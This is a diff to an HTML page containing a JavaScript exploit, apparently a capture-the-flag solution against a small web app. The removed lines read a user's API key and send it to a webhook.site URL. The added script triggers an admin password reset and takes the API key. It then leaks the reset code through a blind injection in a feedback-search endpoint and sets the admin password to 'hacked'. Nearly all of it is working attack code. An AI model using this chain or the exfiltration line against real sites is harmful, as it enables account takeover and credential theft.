@@ -1,4 +1,59 @@
+<!DOCTYPE html>
+<html>
+<body>
 <script>
-let api = fetch('http://web:80/api/me.php').json().api_key
-fetch('https://webhook.site/ccbf9aeb-a2b7-4610-b41d-bd08ed56340b/?c='+api)
+async function exploit() {
+  try {
+    // Submit dummy feedback to ensure table has entries for blind injection
+    await fetch('/submit_feedback.php', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: 'username=test&feedback=test&captcha=ignored' // CAPTCHA bypassed in bot context or manual test
+    });
+
+    // Trigger admin password reset
+    await fetch('/forgot_password.php', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: 'username=admin'
+    });
+
+    // Get dev API key
+    let meRes = await fetch('/api/me.php');
+    let me = await meRes.json();
+    let apiKey = me.api_key;
+
+    // Blind DQL injection to leak reset code (64 hex chars)
+    let code = '';
+    const chars = '0123456789abcdef';
+    for (let pos = 0; pos < 64; pos++) {
+      let found = false;
+      for (let c of chars) {
+        let prefix = code + c;
+        let inject = "0 UNION SELECT id,username,feedback,created_at FROM feedback WHERE (SELECT code FROM users WHERE username='admin') LIKE '" + prefix + "%' -- ";
+        let url = '/api/search_feedback.php?feedback_id=' + encodeURIComponent(inject);
+        let res = await fetch(url, { headers: { 'X-API-Key': apiKey } });
+        let data = await res.json();
+        if (data.pagination.total > 0) {
+          code += c;
+          found = true;
+          break;
+        }
+      }
+      if (!found) throw new Error('Leak failed at pos ' + pos);
+    }
+
+    // Reset admin password using leaked code
+    await fetch('/reset.php', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: 'code=' + encodeURIComponent(code) + '&new_password=hacked'
+    });
+  } catch (e) {
+    console.error(e);
+  }
+}
+exploit();
 </script>
+</body>
+</html>
